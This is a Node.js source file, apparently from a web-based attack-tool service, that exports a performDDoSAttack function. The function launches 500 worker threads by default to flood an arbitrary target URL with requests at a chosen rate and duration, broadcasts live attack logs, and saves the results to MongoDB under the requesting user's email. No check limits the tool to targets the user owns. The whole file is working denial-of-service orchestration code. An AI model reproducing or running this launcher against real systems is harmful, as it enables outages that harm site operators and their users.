const { Worker } = require('worker_threads');
const path = require('path');
const xssSchema=require('./Models/XSSModel');


// // const { broadcastLog } = require('./server');

const performDDoSAttack = (userEmail,targetUrl, requestsPerSecond, durationSeconds, broadcastLog,threadCount = 500) => {
  console.log("email received in ddosAttack.js",userEmail);
  const totalRequests = requestsPerSecond * durationSeconds;
  const requestsPerThread = Math.ceil(totalRequests / threadCount);

  const launchMessage = `[DDoS] Launching ${threadCount} threads for ${totalRequests} requests`;
  console.log(launchMessage);
  broadcastLog(launchMessage);
  let logs = ""; 
  let exitedCount = 0; 



  for (let i = 0; i < threadCount; i++) {
    const worker = new Worker(path.resolve('./ddosWorker.js'), {
      workerData: {
        targetUrl,
        requestsToSend: requestsPerThread
      }
    });

    worker.on('message', msg => {
      const log = `server> ${msg}`;
      logs= `${logs}\n${log}`; // Append the log message to the logs variable
      console.log(log);
      broadcastLog(log);
    });

    worker.on('error', err => {
      const errMsg = `server> Error: ${err.message}`;
      logs= `${logs}\n${errMsg}`; // Append the error message to the logs variable
      console.error(errMsg);
      broadcastLog(errMsg);
    });

    worker.on('exit', async code => {
      const exitMsg = `server>[ Attack Thread ${i + 1}] Exited with code ${code}`;
      console.log(exitMsg);
      broadcastLog(exitMsg);
      exitedCount++; 

        if (exitedCount === threadCount) { // ADD FROM HERE
          const timestamp = new Date().toISOString();
          const result = {
            useremail:userEmail,
            date: timestamp,
            type: 'DDoS',
            result: logs
          };
           console.log('Saving to MongoDB:', result);

          try {
            await xssSchema.create(result);
            const doneMsg = `[DDoS] Attack Finished. Logs saved to MongoDB.`;
            console.log(doneMsg);
            broadcastLog(doneMsg);
          } catch (err) {
            console.error(`[MongoDB] Save Failed: ${err.message}`);
            broadcastLog(`[MongoDB] Save Failed: ${err.message}`);
          }
        }


    });
  }
};

module.exports= { performDDoSAttack };
